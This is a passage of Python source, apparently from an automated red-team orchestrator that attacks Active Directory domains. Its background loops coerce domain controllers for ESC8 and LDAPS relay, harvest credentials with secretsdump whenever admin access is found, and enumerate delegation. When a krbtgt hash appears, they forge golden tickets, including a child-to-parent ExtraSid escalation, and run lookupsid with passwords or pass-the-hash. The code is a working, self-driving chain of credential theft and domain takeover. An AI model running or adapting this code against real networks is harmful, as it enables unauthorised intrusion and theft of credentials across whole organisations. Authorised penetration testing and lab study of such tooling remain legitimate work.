                    techniques=["petitpotam", "coercer"],
                    payload_override={
                        "attack_type": "esc8",
                        "adcs_server": server_ip,
                        "adcs_hostname": server_hostname,
                        "coerce_target": target_dc.ip,
                        "coerce_hostname": target_dc.hostname,
                        "note": (
                            f"ESC8 relay: {server_hostname or server_ip}/certsrv/, "
                            f"coerce target: {target_dc.hostname or target_dc.ip}."
                        ),
                    },
                )

                # Always mark as processed to prevent retry storm when throttled
                state.processed_esc8_servers.add(server_ip)
                if task_id:
                    logger.info(
                        f"🎯 Auto ESC8 coercion dispatched: relay to ADCS {server_hostname or server_ip}, coerce DC {target_dc.hostname or target_dc.ip} (task {task_id})"
                    )

            # === DC COERCION FOR LDAPS RELAY ===
            # Even without ADCS, coercing DCs to an LDAPS relay can grant RBCD/shadow creds
            for host in state.all_hosts:
                # Reuse the _is_dc function defined above for ESC8
                if not _is_dc(host) or host.ip in state.processed_coerced_dcs:
                    continue

                # Only coerce if we have credentials to authenticate the relay
                if not state.all_credentials:
                    continue

                # Dispatch LDAPS relay coercion
                task_id = await dispatcher.request_coercion(
                    source_agent="orchestrator",
                    techniques=["petitpotam", "coercer"],
                    payload_override={
                        "attack_type": "ldaps_relay",
                        "coerce_target": host.ip,
                        "coerce_hostname": host.hostname,
                        "relay_target": host.ip,  # Relay to same DC's LDAPS
                        "note": (
                            f"LDAPS relay: ldaps://{host.ip}, "
                            f"coerce target: {host.hostname or host.ip}."
                        ),
                    },
                )

                # Always mark as processed to prevent retry storm when throttled
                state.processed_coerced_dcs.add(host.ip)
                if task_id:
                    logger.info(
                        f"🎯 Auto LDAPS relay coercion dispatched: coerce DC {host.hostname or host.ip} "
                        f"for RBCD (task {task_id})"
                    )
                # Only do one DC at a time to avoid overwhelming the coercion agent
                break

            # === WRITABLE SHARE NOTIFICATION ===
            # Log writable shares that could be used for file-based coercion (.lnk/.scf drops)
            # Note: slinky module not currently available, but we flag the opportunity
            for share in state.all_shares:
                perms = (share.permissions or "").upper()
                if "WRITE" not in perms:
                    continue

                share_key = f"{share.host.lower()}:{share.name.lower()}"
                if share_key in state.processed_writable_shares:
                    continue

                # Skip admin shares
                if share.name.lower() in ("admin$", "c$", "d$", "e$", "ipc$"):
                    continue

                state.processed_writable_shares.add(share_key)
                logger.info(
                    f"Writable share detected: {share.host}/{share.name} ({perms}) - potential for file-based coercion"
                )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto coercion error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_delegation_enumeration(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 15.0,
) -> None:
    """
    Background task that automatically runs delegation enumeration for discovered credentials.

    When credentials are discovered, dispatches find_delegation tasks to enumerate:
    - Unconstrained delegation (machines that can impersonate any user)
    - Constrained delegation (machines that can impersonate to specific services)

    These are high-value targets for privilege escalation.

    Note: Immediate delegation dispatch also happens in publish_credential() for cracked
    hashes. This periodic loop serves as a backup for other credential sources.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks for new credentials (default: 15s for faster detection)
    """
    # NOTE: Processed credentials are persisted in state.processed_delegation_creds
    # Format: "domain:username" - successful delegation enumerations
    # Track dispatched tasks: task_id -> cred_key (transient, for completion tracking)
    dispatched_tasks: dict[str, str] = {}

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete (multi-forest aware)
            if _should_stop_background_task(state):
                logger.debug("Operation complete, stopping delegation enumeration")
                break

            # Check for completed/failed tasks and update state accordingly
            completed_task_ids = list(dispatched_tasks.keys())
            for task_id in completed_task_ids:
                cred_key = dispatched_tasks[task_id]

                # Check if task is still pending (running)
                if task_id in state.pending_tasks:
                    continue  # Still running, check later

                # Task finished - check if it succeeded or failed
                task_result = state.completed_tasks.get(task_id)
                if task_result:
                    # Remove from dispatched regardless of outcome
                    del dispatched_tasks[task_id]

                    if task_result.success:
                        # Task succeeded - persist to state (won't retry after restart)
                        state.processed_delegation_creds.add(cred_key)
                        logger.info(f"Auto-delegation task {task_id} succeeded for {cred_key}")
                    else:
                        # Task failed - DON'T add to state so it can be retried
                        logger.warning(
                            f"Auto-delegation task {task_id} failed for {cred_key}: {task_result.error}. Will retry."
                        )
                else:
                    # Task not in pending or completed - probably lost, allow retry
                    logger.warning(
                        f"Auto-delegation task {task_id} missing for {cred_key}, allowing retry"
                    )
                    del dispatched_tasks[task_id]

            # Need credentials to enumerate delegation
            if not state.all_credentials:
                logger.debug("Auto-delegation: waiting for credentials")
                continue

            # Find new credentials with usable passwords (not placeholders)
            for cred in state.all_credentials:
                if not cred.has_usable_password:
                    continue

                cred_key = f"{(cred.domain or '').lower()}:{cred.username.lower()}"

                # Skip if already processed successfully (persisted in state)
                if cred_key in state.processed_delegation_creds:
                    continue

                # Skip if currently dispatched (task in flight)
                if cred_key in dispatched_tasks.values():
                    continue

                # Get domain for this credential
                domain = cred.domain or (state.target.domain if state.target else "")
                if not domain:
                    continue

                # Dispatch delegation enumeration to PRIVESC agent (has DelegationTools)
                # Note: request_privesc_enumeration() has its own deduplication check against
                # pending_tasks, so it may return "" if a task already exists for this credential.
                task_id = await dispatcher.request_privesc_enumeration(
                    source_agent="orchestrator",
                    domain=domain,
                    username=cred.username,
                    password=cred.password,
                    techniques=["find_delegation"],
                )

                if task_id and task_id != "deferred":
                    # Track as dispatched - will be marked processed only on success
                    dispatched_tasks[task_id] = cred_key
                    logger.info(
                        f"Auto-delegation: dispatched find_delegation task {task_id} "
                        f"for {cred.domain}\\{cred.username}"
                    )
                elif task_id == "deferred":
                    # Task queued to deferred queue - will run when capacity allows
                    logger.debug(
                        f"Auto-delegation: find_delegation for {cred.domain}\\{cred.username} "
                        "deferred to background queue"
                    )
                else:
                    # Task was deduplicated (already pending)
                    logger.debug(
                        f"Auto-delegation: find_delegation for {cred.domain}\\{cred.username} "
                        "already pending"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto delegation enumeration error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_local_admin_secretsdump(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 45.0,
) -> None:
    """
    Background task that automatically runs secretsdump when local admin access is detected.

    When BloodHound or CME identifies that a user has local admin rights on a host,
    this workflow automatically dispatches secretsdump to harvest credentials.

    This catches scenarios like:
    - User is member of local Administrators group
    - User has AdminTo relationship in BloodHound
    - CME reports "Pwn3d!" for a credential/host combination

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks for admin access opportunities
    """
    # Track (host_ip, username, domain) -> task_id for in-flight deduplication (transient)
    secretsdump_attempts: dict[tuple[str, str, str], str] = {}
    # NOTE: successful hosts are persisted in state.processed_secretsdump for restart recovery
    failed_attempts: dict[tuple[str, str, str], int] = {}  # Track failures for retry limiting
    max_retries = 2

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete (multi-forest aware)
            if _should_stop_background_task(state):
                logger.debug("Operation complete, stopping auto local admin secretsdump")
                break

            # Check completed tasks to update tracking
            for key, task_id in list(secretsdump_attempts.items()):
                host_ip, username, domain = key

                # Skip deferred tasks - they're queued but not yet submitted
                # The deferred queue processor will handle them
                if task_id == "deferred":
                    continue

                # Check if task completed
                if task_id not in state.pending_tasks:
                    task_result = state.completed_tasks.get(task_id)
                    if task_result and task_result.success:
                        # Persist successful host to state for restart recovery
                        state.processed_secretsdump.add(host_ip)
                        logger.info(
                            f"Auto-secretsdump succeeded on {host_ip} with {domain}\\{username}"
                        )
                    elif task_result and not task_result.success:
                        failed_attempts[key] = failed_attempts.get(key, 0) + 1
                        logger.warning(
                            f"Auto-secretsdump failed on {host_ip} with {domain}\\{username}: {task_result.error} (attempt {failed_attempts[key]}/{max_retries})"
                        )
                    del secretsdump_attempts[key]

            # Find credentials marked as admin
            admin_creds = [c for c in state.all_credentials if c.is_admin and c.password]

            if not admin_creds:
                logger.debug("Auto-secretsdump: no admin credentials found yet")
                continue

            # For each admin credential, try to run secretsdump on relevant hosts
            for cred in admin_creds:
                cred_domain = cred.domain or ""

                # Find hosts in the same domain or hosts where this cred was marked admin
                target_hosts = []
                for host in state.all_hosts:
                    # Skip already successful hosts
                    if host.ip in state.processed_secretsdump:
                        continue

                    # Skip hosts without IP
                    if not host.ip:
                        continue

                    # Check if credential source mentions this host (e.g., "Pwn3d! on 192.168.58.10")
                    source_lower = cred.source.lower()
                    if host.ip in source_lower or (
                        host.hostname and host.hostname.lower() in source_lower
                    ):
                        target_hosts.append(host)
                        continue

                    # Check if host is a DC for the credential's domain (high value target)
                    if host.is_dc and cred_domain:
                        hostname_lower = (host.hostname or "").lower()
                        if cred_domain.lower() in hostname_lower:
                            target_hosts.append(host)

                for host in target_hosts:
                    key = (host.ip, cred.username.lower(), cred_domain.lower())

                    # Skip if already attempted and in-flight
                    if key in secretsdump_attempts:
                        continue

                    # Skip if max retries reached
                    if failed_attempts.get(key, 0) >= max_retries:
                        continue

                    # Dispatch secretsdump task
                    logger.info(
                        f"🔓 Auto-secretsdump: Admin access detected for {cred_domain}\\{cred.username} "
                        f"on {host.ip} ({host.hostname}), dispatching secretsdump"
                    )

                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=cred_domain or (state.target.domain if state.target else ""),
                        target_ips=[host.ip],
                        username=cred.username,
                        password=cred.password,
                        reason="auto_local_admin_secretsdump",
                        techniques=["secretsdump"],
                    )

                    if task_id and task_id != "deferred":
                        secretsdump_attempts[key] = task_id
                        logger.info(
                            f"Auto-secretsdump task {task_id} dispatched for "
                            f"{cred_domain}\\{cred.username} -> {host.ip}"
                        )
                    elif task_id == "deferred":
                        # Task queued to deferred queue - mark as attempted to prevent retry storm
                        secretsdump_attempts[key] = "deferred"
                        logger.debug(
                            f"Auto-secretsdump for {cred_domain}\\{cred.username} -> {host.ip} "
                            "deferred to background queue"
                        )

            # Also check for BloodHound AdminTo relationships
            # These are stored in discovered_vulnerabilities with local_admin type
            # Snapshot to avoid "dict changed size during iteration" from concurrent access
            for vuln_id, vuln in list(state.discovered_vulnerabilities.items()):
                if vuln.vuln_type not in ("local_admin", "AdminTo", "CanRDP"):
                    continue

                if vuln_id in state.exploited_vulnerabilities:
                    continue

                target_ip = vuln.target
                if not target_ip or target_ip in state.processed_secretsdump:
                    continue

                # Get details about who has admin access
                # Defensive: ensure vuln.details is a dict before calling .get()
                details = vuln.details if isinstance(vuln.details, dict) else {}
                admin_user = details.get("username") or details.get("principal")
                admin_domain = details.get("domain", "")

                if not admin_user:
                    continue

                # Find matching credential
                matching_cred = None
                for cred in state.all_credentials:
                    if (
                        cred.username.lower() == admin_user.lower()
                        and cred.password
                        and (not admin_domain or cred.domain.lower() == admin_domain.lower())
                    ):
                        matching_cred = cred
                        break

                if not matching_cred:
                    logger.debug(
                        f"Auto-secretsdump: Found {vuln.vuln_type} for {admin_user} on {target_ip} "
                        f"but no matching password credential"
                    )
                    continue

                key = (target_ip, admin_user.lower(), admin_domain.lower())

                if key in secretsdump_attempts or failed_attempts.get(key, 0) >= max_retries:
                    continue

                logger.info(
                    f"🔓 Auto-secretsdump: BloodHound {vuln.vuln_type} detected - "
                    f"{admin_domain}\\{admin_user} has admin on {target_ip}, dispatching secretsdump"
                )

                task_id = await dispatcher.request_credential_access(
                    source_agent="orchestrator",
                    domain=admin_domain or (state.target.domain if state.target else ""),
                    target_ips=[target_ip],
                    username=matching_cred.username,
                    password=matching_cred.password,
                    reason=f"auto_bloodhound_{vuln.vuln_type}",
                    techniques=["secretsdump"],
                )

                if task_id and task_id != "deferred":
                    secretsdump_attempts[key] = task_id
                    # Mark vulnerability as exploited to avoid re-processing
                    state.mark_exploited(vuln_id)
                    logger.info(
                        f"Auto-secretsdump task {task_id} dispatched for BloodHound {vuln.vuln_type}"
                    )
                elif task_id == "deferred":
                    # Task queued to deferred queue - mark as attempted to prevent retry storm
                    secretsdump_attempts[key] = "deferred"
                    state.mark_exploited(vuln_id)
                    logger.debug(
                        f"Auto-secretsdump for BloodHound {vuln.vuln_type} deferred to background queue"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto local admin secretsdump error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


class TransientToolError(Exception):
    """Raised when a tool fails due to transient infrastructure issues (Redis timeout, network)."""


def _is_transient_tool_error(stderr: str, return_code: int) -> bool:
    """Check if a tool error is transient and worth retrying.

    Transient errors include Redis timeouts, network issues, and cases where
    the command didn't execute at all. Permanent errors include authentication
    failures and actual tool output that doesn't contain expected data.

    Args:
        stderr: Standard error output from the tool
        return_code: Exit code from the tool

    Returns:
        True if the error appears transient and should be retried
    """
    # Redis/network errors are transient
    transient_patterns = [
        "timeout reading from redis",
        "connectionerror",
        "connection refused",
        "name or service not known",
        "network is unreachable",
        "timed out",
        "connection reset",
        "broken pipe",
        "no route to host",
    ]
    stderr_lower = stderr.lower()
    for pattern in transient_patterns:
        if pattern in stderr_lower:
            return True

    # Empty stderr with non-zero exit often means command didn't execute
    # (infrastructure failure before tool could run)
    return bool(return_code != 0 and not stderr.strip())


async def _get_domain_sid_via_ldap(
    dc_ip: str, domain: str, cred: Any | None, auth_hash: Any | None
) -> str | None:
    """Get domain SID via LDAP query (fallback when lookupsid fails)."""
    import base64
    import re

    domain_dn = ",".join(f"DC={part}" for part in domain.split("."))
    if cred and cred.password:
        cmd = [
            "ldapsearch",
            "-LLL",
            "-H",
            f"ldap://{dc_ip}",
            "-D",
            f"{cred.username}@{cred.domain or domain}",
            "-w",
            cred.password,
            "-b",
            domain_dn,
            "-s",
            "base",
            "objectSid",
        ]
    elif auth_hash:
        logger.debug("LDAP SID lookup with hash not implemented")
        return None
    else:
        return None
    try:
        stdout, _stderr, rc = await _async_run_tool(cmd, timeout_seconds=30, target_role="recon")
        if rc != 0:
            return None
        b64_match = re.search(r"objectSid::\s*(\S+)", stdout)
        if b64_match:
            sid_bytes = base64.b64decode(b64_match.group(1))
            return _binary_sid_to_string(sid_bytes)
        str_match = re.search(r"objectSid:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", stdout)
        return str_match.group(1) if str_match else None
    except Exception as e:
        logger.debug(f"LDAP SID query error: {e}")
        return None


def _binary_sid_to_string(sid_bytes: bytes) -> str:
    """Convert binary SID to string (S-1-5-21-...)."""
    if len(sid_bytes) < 8:
        raise ValueError("SID too short")
    revision = sid_bytes[0]
    num_sub_auths = sid_bytes[1]
    id_auth = int.from_bytes(sid_bytes[2:8], byteorder="big")
    sub_auths = []
    for i in range(num_sub_auths):
        offset = 8 + i * 4
        sub_auths.append(int.from_bytes(sid_bytes[offset : offset + 4], byteorder="little"))
    return f"S-{revision}-{id_auth}" + "".join(f"-{sa}" for sa in sub_auths)


async def _run_lookupsid_with_retry(
    cmd: list[str],
    timeout_seconds: int = 60,
    max_attempts: int = 3,
) -> tuple[str, str, int]:
    """Run impacket-lookupsid with retry on transient errors.

    Uses exponential backoff with jitter to handle Redis timeouts and
    network issues gracefully. Only retries transient errors - permanent
    failures (auth errors, etc.) fail immediately.

    Args:
        cmd: The lookupsid command to execute
        timeout_seconds: Timeout for each attempt
        max_attempts: Maximum number of retry attempts

    Returns:
        Tuple of (stdout, stderr, return_code)

    Raises:
        TransientToolError: If all retries exhausted due to transient errors
    """

    async for attempt in AsyncRetrying(
        stop=stop_after_attempt(max_attempts),
        wait=wait_random_exponential(multiplier=1, max=30),
        retry=retry_if_exception_type(TransientToolError),
        reraise=True,
    ):
        with attempt:
            stdout, stderr, return_code = await _async_run_tool(
                cmd, timeout_seconds=timeout_seconds
            )

            if return_code != 0 and _is_transient_tool_error(stderr, return_code):
                err_preview = stderr[:150] if stderr else "empty stderr"
                logger.warning(f"🎫 Transient lookupsid error (will retry): {err_preview}")
                raise TransientToolError(
                    f"Transient error: {stderr[:200] if stderr else 'no output'}"
                )

            return stdout, stderr, return_code

    raise RuntimeError("lookupsid retry loop exited unexpectedly")


async def _auto_golden_ticket(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Background task that automatically generates golden ticket when krbtgt hash is found.

    Monitors the shared state for krbtgt hashes and automatically:
    1. Extracts domain SID via lookupsid
    2. Generates golden ticket with impacket-ticketer
    3. Stores ticket info in state.golden_tickets (persisted to Redis)
    4. Sets has_golden_ticket flag in state

    This provides persistent domain admin access.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks
    """
    import re

    first_check = True
    while True:
        try:
            # Check immediately on first iteration, then sleep between subsequent checks.
            # This avoids missing krbtgt hashes discovered just before we start.
            if not first_check:
                await asyncio.sleep(check_interval)
            first_check = False

            state = dispatcher.shared_state

            # Sync hashes, credentials, and DA domains from Redis to pick up injected data
            # This allows inject-hash/inject-credential CLI commands to work for testing
            if dispatcher._task_queue and dispatcher._task_queue.redis:
                try:
                    from ares.core.state_backend import RedisStateBackend

                    backend = RedisStateBackend(dispatcher._task_queue.redis, state.operation_id)
                    # Merge Redis hashes into in-memory state
                    redis_hashes = await backend.get_hashes()
                    for h in redis_hashes:
                        if not any(
                            existing.username.lower() == h.username.lower()
                            and existing.domain.lower() == (h.domain or "").lower()
                            and existing.hash_value == h.hash_value
                            for existing in state.all_hashes
                        ):
                            state.all_hashes.append(h)
                    # Merge Redis credentials into in-memory state
                    redis_creds = await backend.get_credentials()
                    for c in redis_creds:
                        existing_cred = next(
                            (
                                ex
                                for ex in state.all_credentials
                                if ex.username.lower() == c.username.lower()
                                and ex.domain.lower() == (c.domain or "").lower()
                            ),
                            None,
                        )
                        if existing_cred is None:
                            state.all_credentials.append(c)
                        elif c.is_admin and not existing_cred.is_admin:
                            existing_cred.is_admin = True
                    # Merge Redis domain_admin_domains into in-memory state
                    redis_da_domains = await backend.get_domain_admin_domains()
                    for d in redis_da_domains:
                        if d.lower() not in [x.lower() for x in state.domain_admin_domains]:
                            state.domain_admin_domains.append(d.lower())
                    # Merge Redis domain_sids into in-memory state
                    # This allows inject-domain-sid CLI command to work for testing
                    redis_domain_sids = await backend.get_domain_sids()
                    state.domain_sids.update(redis_domain_sids)
                    # Merge Redis domain_controllers into in-memory state
                    # This allows manually set DC maps to be picked up
                    dc_key = f"ares:op:{state.operation_id}:domain_controllers"
                    redis_client = dispatcher._task_queue.redis
                    redis_dcs = await redis_client.hgetall(dc_key)
                    if redis_dcs:
                        for dc_domain, dc_ip in redis_dcs.items():
                            d = dc_domain if isinstance(dc_domain, str) else dc_domain.decode()
                            ip = dc_ip if isinstance(dc_ip, str) else dc_ip.decode()
                            if d.lower() not in state.domain_controllers:
                                state.domain_controllers[d.lower()] = ip
                    # Sync hosts and domains from Redis (picks up CLI inject-host data)
                    # This is critical for _get_foreign_domains to validate essos.local etc.
                    await state.sync_hosts_and_domains_from_redis()
                except Exception as sync_err:
                    logger.debug(f"🎫 Auto-golden-ticket: Redis sync error (non-fatal): {sync_err}")

            # Get domains that already have golden tickets (from persisted state)
            # Exclude failed attempts so they can be retried
            processed_domains = {
                t.get("domain", "").lower()
                for t in state.golden_tickets
                if t.get("domain")
                and t.get("status") not in ("failed_ticketer", "failed_exception")
            }

            # Check for unprocessed krbtgt hashes BEFORE checking completed flag.
            # This ensures we process any krbtgt hashes even if the orchestrator
            # marked the operation complete while we were sleeping.
            pending_krbtgt_domains = set()
            for hash_obj in state.all_hashes:
                if hash_obj.username.lower() == "krbtgt" and hash_obj.hash_type.lower() == "ntlm":
                    domain = (hash_obj.domain or "").lower()
                    if domain and domain not in processed_domains:
                        pending_krbtgt_domains.add(domain)

            # Only exit if operation is complete AND no unprocessed krbtgt hashes
            if state.completed and not pending_krbtgt_domains:
                logger.debug(
                    "Operation complete and no pending krbtgt hashes, stopping auto golden ticket"
                )
                break

            # Look for krbtgt hashes we haven't processed yet
            for hash_obj in state.all_hashes:
                if hash_obj.username.lower() != "krbtgt":
                    continue

                if hash_obj.hash_type.lower() != "ntlm":
                    continue

                domain = hash_obj.domain
                if not domain or domain.lower() in processed_domains:
                    continue

                # Found unprocessed krbtgt hash!
                logger.info(
                    f"🎫 Auto-golden-ticket: Found krbtgt hash for {domain}, "
                    "attempting to generate golden ticket"
                )

                # FIRST check if we have a cached domain SID (from secretsdump or manual injection)
                # This allows golden ticket generation without needing credentials for lookupsid
                # Reload domain_sids from Redis in case they were injected externally
                if dispatcher._task_queue and dispatcher._task_queue.redis:
                    try:
                        from ares.core.state_backend import RedisStateBackend

                        backend = RedisStateBackend(
                            dispatcher._task_queue.redis, state.operation_id
                        )
                        redis_domain_sids = await backend.get_domain_sids()
                        state.domain_sids.update(redis_domain_sids)
                    except Exception as e:
                        logger.debug(f"🎫 Auto-golden-ticket: Failed to reload domain_sids: {e}")
                domain_sid = state.domain_sids.get(domain.lower())
                cred = None
                auth_hash = None

                if domain_sid:
                    logger.info(
                        f"🎫 Auto-golden-ticket: Using cached domain SID for {domain}: {domain_sid}"
                    )
                    # Skip credential lookup - we don't need lookupsid
                else:
                    # No cached SID - need credentials to run lookupsid
                    # Priority: same-domain password > ANY password > same-domain hash > any hash
                    # Password credentials are more reliable than hashes because hash domains
                    # can be incorrectly assigned due to hostname/state sync race conditions.
                    # Cross-domain password auth works via trust relationships.

                    # 1. Try to find password credential for this domain first (most reliable)
                    for c in state.all_credentials:
                        if c.password and c.domain and c.domain.lower() == domain.lower():
                            cred = c
                            break

                    # 2. Try ANY password credential (cross-domain auth works via trust)
                    if not cred:
                        for c in state.all_credentials:
                            if c.password:
                                cred = c
                                break

                    # 3. Try same-domain NTLM hash (PTH) - less reliable, domain may be wrong
                    if not cred:
                        for h in state.all_hashes:
                            if h.hash_type.lower() != "ntlm":
                                continue
                            # Skip krbtgt and machine accounts - use regular user accounts
                            if h.username.lower() == "krbtgt" or h.username.endswith("$"):
                                continue
                            # Same domain only
                            if h.domain and h.domain.lower() == domain.lower():
                                auth_hash = h
                                logger.debug(
                                    f"🎫 Auto-golden-ticket: Using same-domain hash for {domain}: "
                                    f"{h.domain}\\{h.username}"
                                )
                                break

                    # 4. Try any NTLM hash (cross-domain PTH as last resort)
                    if not cred and not auth_hash:
                        for h in state.all_hashes:
                            if h.hash_type.lower() != "ntlm":
                                continue
                            if h.username.lower() == "krbtgt" or h.username.endswith("$"):
                                continue
                            auth_hash = h
                            break

                    if not cred and not auth_hash:
                        logger.warning(
                            f"🎫 Auto-golden-ticket: No password or hash credential available for SID lookup "
                            f"in {domain}, skipping golden ticket (will retry)"
                        )
                        continue

                # Find DC IP for this domain using dispatcher's robust lookup
                # This handles child domains, forest DCs, DNS SRV, etc.
                dc_ip = dispatcher._find_domain_controller_ip(domain)

                if not dc_ip:
                    logger.warning(f"🎫 Auto-golden-ticket: No DC IP found for {domain}, skipping")
                    # Add failed attempt to state so we don't retry forever
                    state.add_golden_ticket(
                        {
                            "domain": domain,
                            "ticket_path": None,
                            "created_at": datetime.now(timezone.utc).isoformat(),
                            "status": "failed_no_dc",
                        }
                    )
                    # Update processed_domains to prevent duplicate attempts in this iteration
                    processed_domains.add(domain.lower())
                    continue

                # Run lookupsid to get domain SID (with retry for transient errors)
                # Skip if we already have a cached domain SID
                try:
                    from tenacity import RetryError

                    sid_match = None  # Initialize for case where we skip lookupsid
                    output = ""  # Initialize for error handling

                    # Only run lookupsid if we don't already have a cached SID
                    if not domain_sid:
                        if cred:
                            # Password-based auth
                            cmd = [
                                "impacket-lookupsid",
                                f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
                            ]
                            logger.info(
                                f"🎫 Auto-golden-ticket: Running lookupsid with password for "
                                f"{cred.domain}\\{cred.username}"
                            )
                        else:
                            # Hash-based auth (pass-the-hash)
                            # Format: domain/user@target -hashes LMHASH:NTHASH
                            # Extract just the NT hash if full LM:NT format
                            # Note: auth_hash is guaranteed non-None here because we checked
                            # `if not cred and not auth_hash: continue` above
                            assert auth_hash is not None  # noqa: S101
                            nt_hash = auth_hash.hash_value
                            if ":" in nt_hash:
                                nt_hash = nt_hash.split(":")[-1]
                            cmd = [
                                "impacket-lookupsid",
                                f"{auth_hash.domain}/{auth_hash.username}@{dc_ip}",
                                "-hashes",
                                f":{nt_hash}",  # Empty LM hash, just NT hash
                            ]
                            logger.info(
                                f"🎫 Auto-golden-ticket: Running lookupsid with hash (PTH) for "
                                f"{auth_hash.domain}\\{auth_hash.username}"
                            )

                        # Use retry wrapper for lookupsid - handles Redis timeouts gracefully
                        try:
                            stdout, stderr, _ = await _run_lookupsid_with_retry(
                                cmd, timeout_seconds=60
                            )
                        except (TransientToolError, RetryError) as e:
                            # All retries exhausted due to transient errors (Redis timeout, network)
                            # Don't mark as permanently failed - allow retry on next check interval
                            logger.warning(
                                f"🎫 Auto-golden-ticket: Transient errors for {domain} after retries, "
                                f"will retry next interval: {e}"
                            )
                            # Don't add to processed_domains - allow retry on next iteration
                            continue

                        output = stdout + "\n" + (stderr or "")

                        # Debug log to see actual lookupsid output
                        output_preview = output[:300].replace("\n", "\\n") if output else "<empty>"
                        logger.debug(
                            f"🎫 Auto-golden-ticket: lookupsid output for {domain}: {output_preview}"
                        )

                        # Parse domain SID from output
                        sid_match = re.search(
                            r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
                        )

                        # If auth failed (LOGON_FAILURE or ACCOUNT_LOCKED_OUT), try other credentials
                        # This handles cases where hash is from wrong domain or account is locked
                        auth_failed = (
                            "STATUS_LOGON_FAILURE" in output
                            or "STATUS_ACCOUNT_LOCKED_OUT" in output
                        )
                        tried_users = {cred.username.lower()} if cred else set()
                        if not sid_match and auth_failed:
                            logger.warning(
                                f"🎫 Auto-golden-ticket: Auth failed for {domain}, trying other credentials"
                            )
                            # Try other password credentials (skip the one that just failed)
                            for c in state.all_credentials:
                                if not c.password or c.username.lower() in tried_users:
                                    continue
                                tried_users.add(c.username.lower())
                                cmd = [
                                    "impacket-lookupsid",
                                    f"{c.domain}/{c.username}:{c.password}@{dc_ip}",
                                ]
                                logger.info(
                                    f"🎫 Auto-golden-ticket: Retrying lookupsid with "
                                    f"{c.domain}\\{c.username}"
                                )
                                try:
                                    stdout, stderr, _ = await _run_lookupsid_with_retry(
                                        cmd, timeout_seconds=60
                                    )
                                    output = stdout + "\n" + (stderr or "")
                                    output_preview = (
                                        output[:300].replace("\n", "\\n") if output else "<empty>"
                                    )
                                    sid_match = re.search(
                                        r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
                                    )
                                    if sid_match:
                                        break  # Success! Exit retry loop
                                    # If this cred also failed with auth error, continue to next
                                    if (
                                        "STATUS_LOGON_FAILURE" in output
                                        or "STATUS_ACCOUNT_LOCKED_OUT" in output
                                    ):
                                        logger.warning(
                                            f"🎫 Auto-golden-ticket: {c.username} also failed, trying next"
                                        )
                                        continue
                                except (TransientToolError, RetryError):
                                    continue  # Try next credential

                        # Use lookupsid result if successful
                        if sid_match:
                            domain_sid = sid_match.group(1)
                            state.domain_sids[domain.lower()] = domain_sid
                            logger.info(
                                f"🎫 Auto-golden-ticket: Got domain SID {domain_sid} for {domain}"
                            )

                    # If we still don't have domain_sid, try LDAP fallback
                    # (only if we actually ran lookupsid and it failed)
                    if not domain_sid and output:
                        output_preview = output[:300].replace("\n", "\\n") if output else "<empty>"
                        logger.warning(
                            f"🎫 Auto-golden-ticket: lookupsid failed for {domain}, "
                            f"trying LDAP fallback. Output: {output_preview}"
                        )
                        try:
                            domain_sid = await _get_domain_sid_via_ldap(
                                dc_ip, domain, cred, auth_hash
                            )
                            if domain_sid:
                                state.domain_sids[domain.lower()] = domain_sid
                                logger.info(
                                    f"🎫 Auto-golden-ticket: Got domain SID via LDAP: {domain_sid}"
                                )
                        except Exception as ldap_err:
                            logger.warning(f"🎫 Auto-golden-ticket: LDAP failed: {ldap_err}")

                    # Final check - if we still don't have domain_sid, fail
                    if not domain_sid:
                        logger.warning(
                            f"🎫 Auto-golden-ticket: Could not get SID for {domain} "
                            f"via cache, lookupsid, or LDAP"
                        )
                        state.add_golden_ticket(
                            {
                                "domain": domain,
                                "ticket_path": None,
                                "created_at": datetime.now(timezone.utc).isoformat(),
                                "status": "failed_no_sid",
                                "error": output[:500]
                                if output.strip()
                                else "No output from lookupsid",
                            }
                        )
                        processed_domains.add(domain.lower())
                        continue

                    # Check if this is a child domain - if so, get parent SID for ExtraSid
                    # Parent-child trusts have NO SID filtering, so we can inject Enterprise Admin SID
                    parent_domain = None
                    parent_sid = None
                    domain_parts = domain.lower().split(".")
                    if len(domain_parts) >= 3:  # child.parent.tld has 3+ parts
                        potential_parent = ".".join(domain_parts[1:])  # e.g., contoso.local
                        # Parent ALWAYS exists for child domains - it's implicit in the hierarchy
                        # Don't require it to be pre-discovered in state
                        parent_domain = potential_parent
                        logger.info(
                            f"🎫 Auto-golden-ticket: Child domain detected: {domain}\n"
                            f"   Parent domain: {parent_domain} (attempting ExtraSid attack)"
                        )

                    if parent_domain:
                        # Get parent domain's DC IP - MUST validate it's actually a parent DC
                        # The cache may have incorrect mappings (e.g., child DC IP for parent domain
                        # when operation was started with wrong DC IP)
                        parent_dc_ip = None
                        cached_dc_ip = state.domain_controllers.get(parent_domain)

                        if cached_dc_ip:
                            # Validate the cached IP is actually a parent DC, not a child DC
                            # by checking the hostname matches parent domain (not child domain)
                            for host in state.all_hosts:
                                if (
                                    host.ip == cached_dc_ip
                                    and host.is_dc
                                    and host.hostname
                                    and host.hostname.lower().endswith(f".{parent_domain}")
                                    and not host.hostname.lower().endswith(f".{domain.lower()}")
                                ):
                                    parent_dc_ip = cached_dc_ip
                                    break

                            if not parent_dc_ip:
                                # Check if the cached IP is different from
                                # the child domain's DC — if so it's likely
                                # the correct parent DC even without host
